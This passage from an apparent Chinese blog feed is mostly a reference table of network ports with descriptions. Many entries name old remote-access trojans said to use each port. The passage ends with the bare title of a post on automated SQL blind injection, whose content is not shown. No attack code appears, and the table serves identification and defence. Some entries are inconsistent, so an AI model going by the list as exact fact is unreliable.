class="hljs-number">3996</span><span class="hljs-string">端口：木马RemoteAnything开放此端口</span><br><span class="hljs-number">4000</span><span class="hljs-string">端口：腾讯QQ客户端开放此端口</span><br><span class="hljs-number">4060</span><span class="hljs-string">端口：木马RemoteAnything开放此端口</span><br><span class="hljs-number">4092</span><span class="hljs-string">端口：木马WinCrash开放此端口</span><br><span class="hljs-number">4133</span><span class="hljs-string">端口：NUTS</span> <span class="hljs-string">Bootp服务器</span><br><span class="hljs-number">4134</span><span class="hljs-string">端口：NIFTY-Serve</span> <span class="hljs-string">HMI协议</span><br><span class="hljs-number">4141</span><span class="hljs-string">端口：Workflow服务器</span><br><span class="hljs-number">4142</span><span class="hljs-string">端口：文档服务器</span><br><span class="hljs-number">4143</span><span class="hljs-string">端口：文档复制</span><br><span class="hljs-number">4145</span><span class="hljs-string">端口：VVR控制</span><br><span class="hljs-number">4321</span><span class="hljs-string">端口：远程Who</span> <span class="hljs-string">Is查询</span><br><span class="hljs-number">4333</span><span class="hljs-string">端口：微型sql服务器</span><br><span class="hljs-number">4349</span><span class="hljs-string">端口：文件系统端口记录</span><br><span class="hljs-number">4350</span><span class="hljs-string">端口：网络设备</span><br><span class="hljs-number">4351</span><span class="hljs-string">端口：PLCY网络服务</span><br><span class="hljs-number">4453</span><span class="hljs-string">端口：NSS警报管理</span><br><span class="hljs-number">4454</span><span class="hljs-string">端口：NSS代理管理</span><br><span class="hljs-number">4455</span><span class="hljs-string">端口：PR聊天用户</span><br><span class="hljs-number">4456</span><span class="hljs-string">端口：PR聊天服务器</span><br><span class="hljs-number">4457</span><span class="hljs-string">端口：PR注册</span><br><span class="hljs-number">4480</span><span class="hljs-string">端口：Proxy+</span> <span class="hljs-string">HTTP代理端口</span><br><span class="hljs-number">4500</span><span class="hljs-string">端口：Lsass开放端口，不能关闭</span><br><span class="hljs-number">4547</span><span class="hljs-string">端口：Lanner许可管理</span><br><span class="hljs-number">4555</span><span class="hljs-string">端口：RSIP端口</span><br><span class="hljs-number">4590</span><span class="hljs-string">端口：木马ICQTrojan开放此端口</span><br><span class="hljs-number">4672</span><span class="hljs-string">端口：远程文件访问服务器</span><br><span class="hljs-number">4752</span><span class="hljs-string">端口：简单网络音频服务器</span><br><span class="hljs-number">4800</span><span class="hljs-string">端口：Icona快速消息系统</span><br><span class="hljs-number">4801</span><span class="hljs-string">端口：Icona网络聊天</span><br><span class="hljs-number">4802</span><span class="hljs-string">端口：Icona许可系统服务器</span><br><span class="hljs-number">4848</span><span class="hljs-string">端口：App服务器-Admin</span> <span class="hljs-string">HTTP</span><br><span class="hljs-number">4849</span><span class="hljs-string">端口：App服务器-Admin</span> <span class="hljs-string">HTTPS</span><br><span class="hljs-number">4950</span><span class="hljs-string">端口：木马IcqTrojan开放5000端口</span><br><span class="hljs-number">5000</span><span class="hljs-string">端口：木马blazer5，Sockets</span> <span class="hljs-string">de</span> <span class="hljs-string">Troie开放5000端口，一般应关闭</span><br><span class="hljs-number">5001</span><span class="hljs-string">端口：木马Sockets</span> <span class="hljs-string">de</span> <span class="hljs-string">Troie开放5001端口</span><br><span class="hljs-number">5006</span><span class="hljs-string">端口：wsm服务器</span><br><span class="hljs-number">5007</span><span class="hljs-string">端口：wsm服务器ssl</span><br><span class="hljs-number">5022</span><span class="hljs-string">端口：mice服务器</span><br><span class="hljs-number">5050</span><span class="hljs-string">端口：多媒体会议控制协议</span><br><span class="hljs-number">5051</span><span class="hljs-string">端口：ITA代理</span><br><span class="hljs-number">5052</span><span class="hljs-string">端口：ITA管理</span><br><span class="hljs-number">5137</span><span class="hljs-string">端口：MyCTS服务器端口</span><br><span class="hljs-number">5150</span><span class="hljs-string">端口：Ascend通道管理协议</span><br><span class="hljs-number">5154</span><span class="hljs-string">端口：BZFlag游戏服务器</span><br><span class="hljs-number">5190</span><span class="hljs-string">端口：America-Online(美国在线)</span><br><span class="hljs-number">5191</span><span class="hljs-string">端口：AmericaOnline1(美国在线)</span><br><span class="hljs-number">5192</span><span class="hljs-string">端口：AmericaOnline2(美国在线)</span><br><span class="hljs-number">5193</span><span class="hljs-string">端口：AmericaOnline3(美国在线)</span><br><span class="hljs-number">5222</span><span class="hljs-string">端口：Jabber客户端连接</span><br><span class="hljs-number">5225</span><span class="hljs-string">端口：HP(惠普公司)服务器</span><br><span class="hljs-number">5226</span><span class="hljs-string">端口：HP(惠普公司)</span><br><span class="hljs-number">5232</span><span class="hljs-string">端口：SGI绘图软件端口</span><br><span class="hljs-number">5250</span><span class="hljs-string">端口：i网关</span><br><span class="hljs-number">5264</span><span class="hljs-string">端口：3Com网络端口1</span><br><span class="hljs-number">5265</span><span class="hljs-string">端口：3Com网络端口2</span><br><span class="hljs-number">5269</span><span class="hljs-string">端口：Jabber服务器连接</span><br><span class="hljs-number">5306</span><span class="hljs-string">端口：Sun</span> <span class="hljs-string">MC组</span><br><span class="hljs-number">5321</span><span class="hljs-string">端口：木马Sockets</span> <span class="hljs-string">de</span> <span class="hljs-string">Troie开放5321端口</span><br><span class="hljs-number">5400</span><span class="hljs-string">端口：木马Blade</span> <span class="hljs-string">Runner开放此端口</span><br><span class="hljs-number">5401</span><span class="hljs-string">端口：木马Blade</span> <span class="hljs-string">Runner开放此端口</span><br><span class="hljs-number">5402</span><span class="hljs-string">端口：木马Blade</span> <span class="hljs-string">Runner开放此端口</span><br><span class="hljs-number">5405</span><span class="hljs-string">端口：网络支持</span><br><span class="hljs-number">5409</span><span class="hljs-string">端口：Salient数据服务器</span><br><span class="hljs-number">5410</span><span class="hljs-string">端口：Salient用户管理</span><br><span class="hljs-number">5415</span><span class="hljs-string">端口：NS服务器</span><br><span class="hljs-number">5416</span><span class="hljs-string">端口：SNS网关</span><br><span class="hljs-number">5417</span><span class="hljs-string">端口：SNS代理</span><br><span class="hljs-number">5421</span><span class="hljs-string">端口：网络支持2</span><br><span class="hljs-number">5423</span><span class="hljs-string">端口：虚拟用户</span><br><span class="hljs-number">5427</span><span class="hljs-string">端口：SCO-PEER-TTA(Unix系统)</span><br><span class="hljs-number">5432</span><span class="hljs-string">端口：PostgreSQL数据库</span><br><span class="hljs-number">5550</span><span class="hljs-string">端口：木马xtcp开放此端口</span><br><span class="hljs-number">5569</span><span class="hljs-string">端口：木马Robo-Hack开放此端口</span><br><span class="hljs-number">5599</span><span class="hljs-string">端口：公司远程安全安装</span><br><span class="hljs-number">5600</span><span class="hljs-string">端口：公司安全管理</span><br><span class="hljs-number">5601</span><span class="hljs-string">端口：公司安全代理</span><br><span class="hljs-number">5631</span><span class="hljs-string">端口：pcANYWHERE(软件)数据</span><br><span class="hljs-number">5632</span><span class="hljs-string">端口：pcANYWHERE(软件)数据</span><br><span class="hljs-number">5673</span><span class="hljs-string">端口：JACL消息服务器</span><br><span class="hljs-number">5675</span><span class="hljs-string">端口：V5UA应用端口</span><br><span class="hljs-number">5676</span><span class="hljs-string">端口：RA管理</span><br><span class="hljs-number">5678</span><span class="hljs-string">端口：远程复制代理连接</span><br><span class="hljs-number">5679</span><span class="hljs-string">端口：直接电缆连接</span><br><span class="hljs-number">5720</span><span class="hljs-string">端口：MS-执照</span><br><span class="hljs-number">5729</span><span class="hljs-string">端口：Openmail用户代理层</span><br><span class="hljs-number">5730</span><span class="hljs-string">端口：Steltor&#x27;s日历访问</span><br><span class="hljs-number">5731</span><span class="hljs-string">端口：netscape(网景)suiteware</span><br><span class="hljs-number">5732</span><span class="hljs-string">端口：netscape(网景)suiteware</span><br><span class="hljs-number">5742</span><span class="hljs-string">端口：木马WinCrash1.03开放此端口</span><br><span class="hljs-number">5745</span><span class="hljs-string">端口：fcopy-服务器</span><br><span class="hljs-number">5746</span><span class="hljs-string">端口：fcopys-服务器</span><br><span class="hljs-number">5755</span><span class="hljs-string">端口：OpenMail(邮件服务器)桌面网关服务器</span><br><span class="hljs-number">5757</span><span class="hljs-string">端口：OpenMail(邮件服务器)X.500目录服务器</span><br><span class="hljs-number">5766</span><span class="hljs-string">端口：OpenMail</span> <span class="hljs-string">(邮件服务器)NewMail服务器</span><br><span class="hljs-number">5767</span><span class="hljs-string">端口：OpenMail</span> <span class="hljs-string">(邮件服务器)请求代理曾(安全)</span><br><span class="hljs-number">5768</span><span class="hljs-string">端口：OpenMail(邮件服务器)</span> <span class="hljs-string">CMTS服务器</span><br><span class="hljs-number">5777</span><span class="hljs-string">端口：DALI端口</span><br><span class="hljs-number">5800</span><span class="hljs-string">端口：虚拟网络计算</span><br><span class="hljs-number">5801</span><span class="hljs-string">端口：虚拟网络计算</span><br><span class="hljs-number">5802</span><span class="hljs-string">端口：虚拟网络计算HTTP访问,</span> <span class="hljs-string">d</span><br><span class="hljs-number">5803</span><span class="hljs-string">端口：虚拟网络计算HTTP访问,</span> <span class="hljs-string">d</span><br><span class="hljs-number">5900</span><span class="hljs-string">端口：虚拟网络计算机显示0</span><br><span class="hljs-number">5901</span><span class="hljs-string">端口：虚拟网络计算机显示1</span><br><span class="hljs-number">5902</span><span class="hljs-string">端口：虚拟网络计算机显示2</span><br><span class="hljs-number">5903</span><span class="hljs-string">端口：虚拟网络计算机显示3</span><br><span class="hljs-number">6000</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">系统</span><br><span class="hljs-number">6001</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6002</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6003</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6004</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6005</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6006</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6007</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6008</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6009</span><span class="hljs-string">端口：X</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">6456</span><span class="hljs-string">端口：SKIP证书发送</span><br><span class="hljs-number">6471</span><span class="hljs-string">端口：LVision许可管理器</span><br><span class="hljs-number">6505</span><span class="hljs-string">端口：BoKS管理私人端口</span><br><span class="hljs-number">6506</span><span class="hljs-string">端口：BoKS管理公共端口</span><br><span class="hljs-number">6507</span><span class="hljs-string">端口：BoKS</span> <span class="hljs-string">Dir服务器,私人端口</span><br><span class="hljs-number">6508</span><span class="hljs-string">端口：BoKS</span> <span class="hljs-string">Dir服务器,公共端口</span><br><span class="hljs-number">6509</span><span class="hljs-string">端口：MGCS-MFP端口</span><br><span class="hljs-number">6510</span><span class="hljs-string">端口：MCER端口</span><br><span class="hljs-number">6566</span><span class="hljs-string">端口：SANE控制端口</span><br><span class="hljs-number">6580</span><span class="hljs-string">端口：Parsec主服务器</span><br><span class="hljs-number">6581</span><span class="hljs-string">端口：Parsec对等网络</span><br><span class="hljs-number">6582</span><span class="hljs-string">端口：Parsec游戏服务器</span><br><span class="hljs-number">6588</span><span class="hljs-string">端口：AnalogX</span> <span class="hljs-string">HTTP代理端口</span><br><span class="hljs-number">6631</span><span class="hljs-string">端口：Mitchell电信主机</span><br><span class="hljs-number">6667</span><span class="hljs-string">端口：Internet多线交谈</span><br><span class="hljs-number">6668</span><span class="hljs-string">端口：Internet多线交谈</span><br><span class="hljs-number">6670</span><span class="hljs-string">端口：木马Deep</span> <span class="hljs-string">Throat开放此端口</span><br><span class="hljs-number">6671</span><span class="hljs-string">端口：木马Deep</span> <span class="hljs-string">Throat</span> <span class="hljs-number">3.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">6699</span><span class="hljs-string">端口：Napster文件(MP3)共享服务</span><br><span class="hljs-number">6701</span><span class="hljs-string">端口：KTI/ICAD名称服务器</span><br><span class="hljs-number">6788</span><span class="hljs-string">端口：SMC软件-HTTP</span><br><span class="hljs-number">6789</span><span class="hljs-string">端口：SMC软件-HTTPS</span><br><span class="hljs-number">6841</span><span class="hljs-string">端口：Netmo软件默认开放端口</span><br><span class="hljs-number">6842</span><span class="hljs-string">端口：Netmo</span> <span class="hljs-string">HTTP服务</span><br><span class="hljs-number">6883</span><span class="hljs-string">端口：木马DeltaSource开放此端口</span><br><span class="hljs-number">6939</span><span class="hljs-string">端口：木马Indoctrination开放此端口</span><br><span class="hljs-number">6969</span><span class="hljs-string">端口：木马Gatecrasher、Priority开放此端口</span><br><span class="hljs-number">6970</span><span class="hljs-string">端口：real音频开放此端口</span><br><span class="hljs-number">7000</span><span class="hljs-string">端口：木马Remote</span> <span class="hljs-string">Grab开放此端口</span><br><span class="hljs-number">7002</span><span class="hljs-string">端口：使用者&amp;</span> <span class="hljs-string">组</span> <span class="hljs-string">数据库</span><br><span class="hljs-number">7003</span><span class="hljs-string">端口：音量定位数据库</span><br><span class="hljs-number">7004</span><span class="hljs-string">端口：AFS/Kerberos认证服务</span><br><span class="hljs-number">7005</span><span class="hljs-string">端口：音量管理服务</span><br><span class="hljs-number">7006</span><span class="hljs-string">端口：错误解释服务</span><br><span class="hljs-number">7007</span><span class="hljs-string">端口：Basic监督进程</span><br><span class="hljs-number">7008</span><span class="hljs-string">端口：服务器-服务器更新程序</span><br><span class="hljs-number">7009</span><span class="hljs-string">端口：远程缓存管理服务</span><br><span class="hljs-number">7011</span><span class="hljs-string">端口：Talon软件发现端口</span><br><span class="hljs-number">7012</span><span class="hljs-string">端口：Talon软件引擎</span><br><span class="hljs-number">7013</span><span class="hljs-string">端口：Microtalon发现</span><br><span class="hljs-number">7014</span><span class="hljs-string">端口：Microtalon通信</span><br><span class="hljs-number">7015</span><span class="hljs-string">端口：Talon网络服务器</span><br><span class="hljs-number">7020</span><span class="hljs-string">端口：DP服务</span><br><span class="hljs-number">7021</span><span class="hljs-string">端口：DP服务管理</span><br><span class="hljs-number">7100</span><span class="hljs-string">端口：X字型服务</span><br><span class="hljs-number">7121</span><span class="hljs-string">端口：虚拟原型许可证管理</span><br><span class="hljs-number">7300</span><span class="hljs-string">端口：木马NetMonitor开放此端口</span><br><span class="hljs-number">7301</span><span class="hljs-string">端口：木马NetMonitor开放此端口</span><br><span class="hljs-number">7306</span><span class="hljs-string">端口：木马NetMonitor，NetSpy1.0开放此端口</span><br><span class="hljs-number">7307</span><span class="hljs-string">端口：木马NetMonitor开放此端口</span><br><span class="hljs-number">7308</span><span class="hljs-string">端口：木马NetMonitor开放此端口</span><br><span class="hljs-number">7323</span><span class="hljs-string">端口：Sygate服务器端</span><br><span class="hljs-number">7511</span><span class="hljs-string">端口：木马聪明基因开放此端口</span><br><span class="hljs-number">7588</span><span class="hljs-string">端口：Sun许可证管理</span><br><span class="hljs-number">7597</span><span class="hljs-string">端口：木马Quaz开放此端口</span><br><span class="hljs-number">7626</span><span class="hljs-string">端口：木马冰河开放此端口</span><br><span class="hljs-number">7633</span><span class="hljs-string">端口：PMDF管理</span><br><span class="hljs-number">7674</span><span class="hljs-string">端口：iMQ</span> <span class="hljs-string">SSL通道</span><br><span class="hljs-number">7675</span><span class="hljs-string">端口：iMQ通道</span><br><span class="hljs-number">7676</span><span class="hljs-string">端口：木马Giscier开放此端口</span><br><span class="hljs-number">7720</span><span class="hljs-string">端口：Med图象入口</span><br><span class="hljs-number">7743</span><span class="hljs-string">端口：Sakura脚本传递协议</span><br><span class="hljs-number">7789</span><span class="hljs-string">端口：木马ICKiller开放此端口</span><br><span class="hljs-number">7797</span><span class="hljs-string">端口：Propel连接器端口</span><br><span class="hljs-number">7798</span><span class="hljs-string">端口：Propel编码器端口</span><br><span class="hljs-number">8000</span><span class="hljs-string">端口：腾讯QQ服务器端开放此端口</span><br><span class="hljs-number">8001</span><span class="hljs-string">端口：VCOM通道</span><br><span class="hljs-number">8007</span><span class="hljs-string">端口：Apache(类似iis)jServ协议1.x</span><br><span class="hljs-number">8008</span><span class="hljs-string">端口：HTTP</span> <span class="hljs-string">Alternate</span><br><span class="hljs-number">8009</span><span class="hljs-string">端口：Apache(类似iis)JServ协议1.3</span><br><span class="hljs-number">8010</span><span class="hljs-string">端口：Wingate代理开放此端口</span><br><span class="hljs-number">8011</span><span class="hljs-string">端口：木马way2.4开放此端口</span><br><span class="hljs-number">8022</span><span class="hljs-string">端口：OA-系统</span><br><span class="hljs-number">8080</span><span class="hljs-string">端口：WWW代理开放此端口</span><br><span class="hljs-number">8081</span><span class="hljs-string">端口：ICECap控制台</span><br><span class="hljs-number">8082</span><span class="hljs-string">端口：BlackIce(防止黑客软件)警报发送到此端口</span><br><span class="hljs-number">8118</span><span class="hljs-string">端口：Privoxy</span> <span class="hljs-string">HTTP代理</span><br><span class="hljs-number">8121</span><span class="hljs-string">端口：Apollo数据端口</span><br><span class="hljs-number">8122</span><span class="hljs-string">端口：Apollo软件管理端口</span><br><span class="hljs-number">8181</span><span class="hljs-string">端口：Imail</span><br><span class="hljs-number">8225</span><span class="hljs-string">端口：木马灰鸽子开放此端口</span><br><span class="hljs-number">8311</span><span class="hljs-string">端口：木马初恋情人开放此端口</span><br><span class="hljs-number">8351</span><span class="hljs-string">端口：服务器寻找</span><br><span class="hljs-number">8416</span><span class="hljs-string">端口：eSpeech</span> <span class="hljs-string">Session协议</span><br><span class="hljs-number">8417</span><span class="hljs-string">端口：eSpeech</span> <span class="hljs-string">RTP协议</span><br><span class="hljs-number">8473</span><span class="hljs-string">端口：虚拟点对点</span><br><span class="hljs-number">8668</span><span class="hljs-string">端口：网络地址转换</span><br><span class="hljs-number">8786</span><span class="hljs-string">端口：Message客户端</span><br><span class="hljs-number">8787</span><span class="hljs-string">端口：Message服务器</span><br><span class="hljs-number">8954</span><span class="hljs-string">端口：Cumulus管理端口</span><br><span class="hljs-number">9000</span><span class="hljs-string">端口：CS监听</span><br><span class="hljs-number">9001</span><span class="hljs-string">端口：ETL服务管理</span><br><span class="hljs-number">9002</span><span class="hljs-string">端口：动态id验证</span><br><span class="hljs-number">9021</span><span class="hljs-string">端口：Pangolin验证</span><br><span class="hljs-number">9022</span><span class="hljs-string">端口：PrivateArk远程代理</span><br><span class="hljs-number">9023</span><span class="hljs-string">端口：安全网络登陆-1</span><br><span class="hljs-number">9024</span><span class="hljs-string">端口：安全网络登陆-2</span><br><span class="hljs-number">9025</span><span class="hljs-string">端口：安全网络登陆-3</span><br><span class="hljs-number">9026</span><span class="hljs-string">端口：安全网络登陆-4</span><br><span class="hljs-number">9101</span><span class="hljs-string">端口：Bacula控制器</span><br><span class="hljs-number">9102</span><span class="hljs-string">端口：Bacula文件后台</span><br><span class="hljs-number">9103</span><span class="hljs-string">端口：Bacula存储邮件后台</span><br><span class="hljs-number">9111</span><span class="hljs-string">端口：DragonIDS控制台</span><br><span class="hljs-number">9217</span><span class="hljs-string">端口：FSC通讯端口</span><br><span class="hljs-number">9281</span><span class="hljs-string">端口：软件传送端口1</span><br><span class="hljs-number">9282</span><span class="hljs-string">端口：软件传送端口2</span><br><span class="hljs-number">9346</span><span class="hljs-string">端口：C技术监听</span><br><span class="hljs-number">9400</span><span class="hljs-string">端口：木马Incommand</span> <span class="hljs-number">1.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">9401</span><span class="hljs-string">端口：木马Incommand</span> <span class="hljs-number">1.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">9402</span><span class="hljs-string">端口：木马Incommand</span> <span class="hljs-number">1.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">9594</span><span class="hljs-string">端口：信息系统</span><br><span class="hljs-number">9595</span><span class="hljs-string">端口：Ping</span> <span class="hljs-string">Discovery服务</span><br><span class="hljs-number">9800</span><span class="hljs-string">端口：WebDav源端口</span><br><span class="hljs-number">9801</span><span class="hljs-string">端口：Sakura脚本转移协议-2</span><br><span class="hljs-number">9802</span><span class="hljs-string">端口：WebDAV</span> <span class="hljs-string">Source</span> <span class="hljs-string">TLS/SSL</span><br><span class="hljs-number">9872</span><span class="hljs-string">端口：木马Portal</span> <span class="hljs-string">of</span> <span class="hljs-string">Doom开放此端口</span><br><span class="hljs-number">9873</span><span class="hljs-string">端口：木马Portal</span> <span class="hljs-string">of</span> <span class="hljs-string">Doom开放此端口</span><br><span class="hljs-number">9874</span><span class="hljs-string">端口：木马Portal</span> <span class="hljs-string">of</span> <span class="hljs-string">Doom开放此端口</span><br><span class="hljs-number">9875</span><span class="hljs-string">端口：木马Portal</span> <span class="hljs-string">of</span> <span class="hljs-string">Doom开放此端口</span><br><span class="hljs-number">9899</span><span class="hljs-string">端口：木马InIkiller开放此端口</span><br><span class="hljs-number">9909</span><span class="hljs-string">端口：域名时间</span><br><span class="hljs-number">9911</span><span class="hljs-string">端口：SYPECom传送协议</span><br><span class="hljs-number">9989</span><span class="hljs-string">端口：木马iNi-Killer开放此端口</span><br><span class="hljs-number">9990</span><span class="hljs-string">端口：OSM</span> <span class="hljs-string">Applet程序服务器</span><br><span class="hljs-number">9991</span><span class="hljs-string">端口：OSM事件服务器</span><br><span class="hljs-number">10000</span><span class="hljs-string">端口：网络数据管理协议</span><br><span class="hljs-number">10001</span><span class="hljs-string">端口：SCP构造端口</span><br><span class="hljs-number">10005</span><span class="hljs-string">端口：安全远程登陆</span><br><span class="hljs-number">10008</span><span class="hljs-string">端口：Octopus多路器</span><br><span class="hljs-number">10067</span><span class="hljs-string">端口：木马iNi-Killer开放此端口</span><br><span class="hljs-number">10113</span><span class="hljs-string">端口：NetIQ端点</span><br><span class="hljs-number">10115</span><span class="hljs-string">端口：NetIQ端点</span><br><span class="hljs-number">10116</span><span class="hljs-string">端口：NetIQVoIP鉴定器</span><br><span class="hljs-number">10167</span><span class="hljs-string">端口：木马iNi-Killer开放此端口</span><br><span class="hljs-number">11000</span><span class="hljs-string">端口：木马SennaSpy开放此端口</span><br><span class="hljs-number">11113</span><span class="hljs-string">端口：金山词霸开放此端口</span><br><span class="hljs-number">11233</span><span class="hljs-string">端口：木马Progenic</span> <span class="hljs-string">trojan开放此端口</span><br><span class="hljs-number">12076</span><span class="hljs-string">端口：木马Telecommando开放此端口</span><br><span class="hljs-number">12223</span><span class="hljs-string">端口：木马Hack&#x27;99</span> <span class="hljs-string">KeyLogger开放此端口</span><br><span class="hljs-number">12345</span><span class="hljs-string">端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="hljs-number">12346</span><span class="hljs-string">端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="hljs-number">12361</span><span class="hljs-string">端口：木马Whack-a-mole开放此端口</span><br><span class="hljs-number">13223</span><span class="hljs-string">端口：PowWow</span> <span class="hljs-string">客户端，是Tribal</span> <span class="hljs-string">Voice的聊天程序</span><br><span class="hljs-number">13224</span><span class="hljs-string">端口：PowWow</span> <span class="hljs-string">服务器，是Tribal</span> <span class="hljs-string">Voice的聊天程序</span><br><span class="hljs-number">16959</span><span class="hljs-string">端口：木马Subseven开放此端口</span><br><span class="hljs-number">16969</span><span class="hljs-string">端口：木马Priority开放此端口</span><br><span class="hljs-number">17027</span><span class="hljs-string">端口：外向连接</span><br><span class="hljs-number">19191</span><span class="hljs-string">端口：木马蓝色火焰开放此端口</span><br><span class="hljs-number">20000</span><span class="hljs-string">端口：木马Millennium开放此端口</span><br><span class="hljs-number">20001</span><span class="hljs-string">端口：木马Millennium开放此端口</span><br><span class="hljs-number">20034</span><span class="hljs-string">端口：木马NetBus</span> <span class="hljs-string">Pro开放此端口</span><br><span class="hljs-number">21554</span><span class="hljs-string">端口：木马GirlFriend开放此端口</span><br><span class="hljs-number">22222</span><span class="hljs-string">端口：木马Prosiak开放此端口</span><br><span class="hljs-number">23444</span><span class="hljs-string">端口：木马网络公牛开放此端口</span><br><span class="hljs-number">23456</span><span class="hljs-string">端口：木马Evil</span> <span class="hljs-string">FTP、Ugly</span> <span class="hljs-string">FTP开放此端口</span><br><span class="hljs-number">25793</span><span class="hljs-string">端口：Vocaltec地址服务器</span><br><span class="hljs-number">26262</span><span class="hljs-string">端口：K3软件-服务器</span><br><span class="hljs-number">26263</span><span class="hljs-string">端口：K3软件客户端</span><br><span class="hljs-number">26274</span><span class="hljs-string">端口：木马Delta开放此端口</span><br><span class="hljs-number">27374</span><span class="hljs-string">端口：木马Subseven</span> <span class="hljs-number">2.1</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">30100</span><span class="hljs-string">端口：木马NetSphere开放此端口</span><br><span class="hljs-number">30129</span><span class="hljs-string">端口：木马Masters</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">30303</span><span class="hljs-string">端口：木马Socket23开放此端口</span><br><span class="hljs-number">30999</span><span class="hljs-string">端口：木马Kuang开放此端口</span><br><span class="hljs-number">31337</span><span class="hljs-string">端口：木马BO(Back</span> <span class="hljs-string">Orifice)开放此端口</span><br><span class="hljs-number">31338</span><span class="hljs-string">端口：木马BO(Back</span> <span class="hljs-string">Orifice)，DeepBO开放此端口</span><br><span class="hljs-number">31339</span><span class="hljs-string">端口：木马NetSpy</span> <span class="hljs-string">DK开放此端口</span><br><span class="hljs-number">31666</span><span class="hljs-string">端口：木马BOWhack开放此端口</span><br><span class="hljs-number">31789</span><span class="hljs-string">端口：Hack-a-tack</span><br><span class="hljs-number">32770</span><span class="hljs-string">端口：sun</span> <span class="hljs-string">solaris</span> <span class="hljs-string">RPC服务开放此端口</span><br><span class="hljs-number">33333</span><span class="hljs-string">端口：木马Prosiak开放此端口</span><br><span class="hljs-number">33434</span><span class="hljs-string">端口：路由跟踪</span><br><span class="hljs-number">34324</span><span class="hljs-string">端口：木马Tiny</span> <span class="hljs-string">Telnet</span> <span class="hljs-string">Server、BigGluck、TN开放此端口</span><br><span class="hljs-number">36865</span><span class="hljs-string">端口：KastenX软件端口</span><br><span class="hljs-number">38201</span><span class="hljs-string">端口：Galaxy7软件数据通道</span><br><span class="hljs-number">39681</span><span class="hljs-string">端口：TurboNote默认端口</span><br><span class="hljs-number">40412</span><span class="hljs-string">端口：木马The</span> <span class="hljs-string">Spy开放此端口</span><br><span class="hljs-number">40421</span><span class="hljs-string">端口：木马Masters</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">40422</span><span class="hljs-string">端口：木马Masters</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">40423</span><span class="hljs-string">端口：木马Masters</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">40426</span><span class="hljs-string">端口：木马Masters</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">40843</span><span class="hljs-string">端口：CSCC</span> <span class="hljs-string">防火墙</span><br><span class="hljs-number">43210</span><span class="hljs-string">端口：木马SchoolBus</span> <span class="hljs-number">1.0</span><span class="hljs-string">/2.0开放此端口</span><br><span class="hljs-number">43190</span><span class="hljs-string">端口：IP-PROVISION</span><br><span class="hljs-number">44321</span><span class="hljs-string">端口：PCP服务器(pmcd)</span><br><span class="hljs-number">44322</span><span class="hljs-string">端口：PCP服务器(pmcd)代理</span><br><span class="hljs-number">44334</span><span class="hljs-string">端口：微型个人防火墙端口</span><br><span class="hljs-number">44442</span><span class="hljs-string">端口：ColdFusion软件端口</span><br><span class="hljs-number">44443</span><span class="hljs-string">端口：ColdFusion软件端口</span><br><span class="hljs-number">44445</span><span class="hljs-string">端口：木马Happypig开放此端口</span><br><span class="hljs-number">45576</span><span class="hljs-string">端口：E代时光专业代理开放此端口</span><br><span class="hljs-number">47262</span><span class="hljs-string">端口：木马Delta开放此端口</span><br><span class="hljs-number">47624</span><span class="hljs-string">端口：Direct</span> <span class="hljs-string">Play服务器</span><br><span class="hljs-number">47806</span><span class="hljs-string">端口：ALC协议</span><br><span class="hljs-number">48003</span><span class="hljs-string">端口：Nimbus网关</span><br><span class="hljs-number">50505</span><span class="hljs-string">端口：木马Sockets</span> <span class="hljs-string">de</span> <span class="hljs-string">Troie开放此端口</span><br><span class="hljs-number">50766</span><span class="hljs-string">端口：木马Fore开放此端口</span><br><span class="hljs-number">53001</span><span class="hljs-string">端口：木马Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Shutdown开放此端口</span><br><span class="hljs-number">54320</span><span class="hljs-string">端口：木马bo2000开放此端口</span><br><span class="hljs-number">54321</span><span class="hljs-string">端口：木马SchoolBus</span> <span class="hljs-number">1.0</span><span class="hljs-string">/2.0开放此端口</span><br><span class="hljs-number">61466</span><span class="hljs-string">端口：木马Telecommando开放此端口</span><br><span class="hljs-number">65000</span><span class="hljs-string">端口：木马Devil</span> <span class="hljs-number">1.03</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">65301</span><span class="hljs-string">端口：PC</span> <span class="hljs-string">Anywhere软件开放端口</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>端口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python脚本实现自动化sql盲注</title>
    <link href="/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/"/>
    <url>/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/</url>
    
